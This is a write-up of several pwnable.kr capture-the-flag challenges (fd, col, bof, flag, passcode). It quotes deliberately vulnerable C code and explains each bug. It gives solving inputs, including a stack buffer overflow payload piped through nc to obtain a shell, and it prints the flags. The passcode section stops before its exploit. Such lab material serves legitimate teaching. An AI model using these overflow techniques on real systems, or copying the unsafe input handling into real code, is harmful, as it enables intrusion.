# fd

`fd.c`:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

Pass in 0x1234 (4660) as input so that fd = 0 (so the program reads from STDIN). Then type "LETMEWIN", press enter, and get the flag.

flag: `mommy! I think I know what a file descriptor is!!`

# col

`col.c`:
```
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

We have to input a string that's 20 bytes, then the check_password function takes every 4 bytes as an int (the function takes the char pointer to our input and casts it to a int pointer and because ints are 4 bytes in c when we dereference the pointer we are getting 4 bytes of our string as opposed to just one if we have a char pointer) and adds all of the ints up and if it equals 0x21DD09EC we get the flag. We can't use \x00 or null bytes because then strlen will calculate our string input wrong cause null bytes will make our string appear "terminated". 

Running the following command will get us the flag: ``./col `python -c 'print "\xe8\x05\xd9\x1d"+"\x01"*16'``

flag: `daddy! I just managed to create a hash collision :)`

# bof

`bof.c`:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Classic buffer overflow question. In the assembly we see that `$ebp-0x2c` is set for the buffer, and it checks if `$ebp + 0x8 == 0xcafebabe`. So we input 52 A's, then 0xcafebabe (in little endian, so "backwards"). 

We accomplish this with the following payload: `python -c "print 'A'*52+'\xbe\xba\xfe\xca'"`. However, it seems the program checks for stack smashing, so what we need to do is keep STDIN open once we get our shell, cause the program only checks for stack smashing at the end of the `func` function. Because of this, we modify our payload: `(python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat)`. 

We now run `(python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000`, see that we do indeed have a shell, then run `ls`, see the flag file, and then run `cat flag` to get our flag.

flag: `daddy, I just pwned a buFFer :)`

# flag

This is a reversing question, so we're not given a c file, just the binary. If we try to load the binary in IDA, we see that many of the functions were unable to decompiled, and in GDB we can't seem to find the `main` function. Running `strings` on the binary file reveals that it was packed with [UPX](https://upx.github.io/). So we download UPX and unpack the file, getting a new binary. Now if we load this new binary into IDA, we see that everything decompiled successfully. If we look at the assembly of the `main` function, we see a variable called `flag`. We double click it and it reveals a string that looks like our answer.

flag: `UPX...? sounds like a delivery service :)`

# passcode

`passcode.c`:
```
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

The vulnerability in this question lies with the `scanf` where the program asks to enter `passcode1` and `passcode2`. You're supposed to pass in an address of a variable as the 2nd parameter, but the actual variable is passed in instead. So when we run the program, if we type in a random string, we will get a segmentation fault, because the program is expecting our input to be a pointer to something in the memory. If we give it a pointer that points to nothing in the memory (an illegal memory location), we get a segmentation fault.

We can exploit this to our advantage as follows.


